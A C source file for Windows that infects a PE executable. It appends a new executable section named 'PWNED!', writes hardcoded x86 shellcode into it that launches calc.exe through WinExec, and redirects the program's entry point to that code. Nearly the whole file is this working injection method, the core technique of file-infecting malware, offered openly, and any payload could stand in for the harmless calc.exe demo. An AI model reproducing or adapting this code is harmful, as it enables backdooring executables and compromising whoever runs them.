#include<stdio.h>
#include <windows.h>
#define C_EOL "\n"

DWORD alignment(DWORD base, DWORD address);
int main(int argc, char *argv[]) {
	if (argc != 2)
		exit(EXIT_FAILURE);

	HANDLE hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ,
	FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING,
	FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		exit(EXIT_FAILURE);

	/*
	 * Pattern
	 */
	char pattern = 0x00;

	/*
	 * Shellcode JMP EntrypointRedirection
	 * E9 DWORD : Jump near, relative, displacement relative to next instruction
	 */
	char shellcode[] =
"\xEB\x16"             //JMP SHORT 0x16
"\x5B"                 //POP EBX
"\x31\xC0"             //XOR EAX,EAX
"\x50"                 //PUSH EAX
"\x53"                 //PUSH EBX
"\xBB\xF1\x2F\x4D\x76" //MOV EBX, 0x75AD2FF1 ;kernel32.dll WinExec
"\xFF\xD3"             //CALL EBX
"\x31\xC0"             //XOR EAX,EAX
"\x50"                 //PUSH EAX
"\xBB\xD8\x79\x45\x76" //MOV EBX,75A579D8 ;kernel32.dll ExitProcess
"\xFF\xD3"             //CALL EBX
"\xE8\xE5\xFF\xFF\xFF" //CALL 0xE5FFFFFF
"\x63\x61\x6C\x63\x2E\x65\x78\x65"; //ASCII "calc.exe", 0x00
//"\xE9"; //Jump short EOP ~ need enable Write EOP

	DWORD sizeofshellcode = strlen(shellcode) * sizeof(char);

	/*
	 * DUMP PE section headers
	 */
	DWORD dwTaille = 0;
	IMAGE_DOS_HEADER hDOS;
	IMAGE_NT_HEADERS hNT;
	IMAGE_SECTION_HEADER hSection;
	IMAGE_SECTION_HEADER ownSection;
	SetFilePointer(hFile, 0, 0, FILE_BEGIN);
	ReadFile(hFile, &hDOS, sizeof(IMAGE_DOS_HEADER), &dwTaille, NULL);
	SetFilePointer(hFile, hDOS.e_lfanew, 0, FILE_BEGIN);
	ReadFile(hFile, &hNT, sizeof(IMAGE_NT_HEADERS), &dwTaille, NULL);
	int i;
	for (i = 0; i < hNT.FileHeader.NumberOfSections; i++)
		ReadFile(hFile, &hSection, sizeof(IMAGE_SECTION_HEADER), &dwTaille,
		NULL);

	/*
	 * Copy last section
	 */
	ownSection = hSection;
	/*
	 * Craft own section
	 */
	memcpy(ownSection.Name, "PWNED!", 8);
	ownSection.Misc.VirtualSize = alignment(hNT.OptionalHeader.SectionAlignment,
			sizeofshellcode);
	ownSection.VirtualAddress = alignment(hNT.OptionalHeader.SectionAlignment,
			hSection.VirtualAddress + hSection.Misc.VirtualSize);
	ownSection.SizeOfRawData = alignment(hNT.OptionalHeader.FileAlignment,
			sizeofshellcode);
	ownSection.PointerToRawData = alignment(hNT.OptionalHeader.FileAlignment,
			hSection.PointerToRawData + hSection.SizeOfRawData);

	/*
	 * Put privilege of the section
	 */
	ownSection.Characteristics = IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_READ
			+ IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_SHARED + IMAGE_SCN_CNT_CODE;
	ownSection.Misc.PhysicalAddress = ownSection.Misc.VirtualSize;
	ownSection.PointerToRelocations = 0x0;
	ownSection.PointerToLinenumbers = 0x0;
	ownSection.NumberOfRelocations = 0x0;
	ownSection.NumberOfLinenumbers = 0x0;

	/*
	 * Add own section
	 */
	WriteFile(hFile, &ownSection, sizeof(IMAGE_SECTION_HEADER), &dwTaille,
	NULL);

	/*
	 * Write shellcode
	 */
	SetFilePointer(hFile, ownSection.PointerToRawData, 0, FILE_BEGIN);
	WriteFile(hFile, &shellcode, sizeofshellcode, &dwTaille, NULL);

	/*
	 * Calculate and Write Original AddressOfEntryPoint
	 * Original AddressOfEntryPoint is less than VirtualAddress of the own section
	 * This is a relative jump

	DWORD EntryPointRedirection = hNT.OptionalHeader.AddressOfEntryPoint
			- ownSection.VirtualAddress - sizeofshellcode - sizeof(DWORD);
	WriteFile(hFile, &EntryPointRedirection, sizeof(DWORD), &dwTaille, NULL);
	*/

	/*
	 * Write pattern to fill empty
	 */
	for (i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
			i++)
		WriteFile(hFile, &pattern, sizeof(char), &dwTaille, NULL);

	/*
	 * Patch NT header :
	 * - increase NumberOfSections
	 * - recalculate SizeOfImage
	 * - AddressOfEntryPoint redirection
	 */
	hNT.FileHeader.NumberOfSections++;
	hNT.OptionalHeader.SizeOfImage = alignment(hNT.OptionalHeader.FileAlignment,
			hNT.OptionalHeader.SizeOfImage + ownSection.SizeOfRawData);
	hNT.OptionalHeader.AddressOfEntryPoint = ownSection.VirtualAddress;
	SetFilePointer(hFile, hDOS.e_lfanew, 0, FILE_BEGIN);
	WriteFile(hFile, &hNT, sizeof(IMAGE_NT_HEADERS), &dwTaille, NULL);

	CloseHandle(hFile);
	return 0;
}

/*
 * Calculate Alignment between base and address
 */
DWORD alignment(DWORD base, DWORD address) {
	return (address % base == 0) ? address : (((address / base) + 1) * base);
}
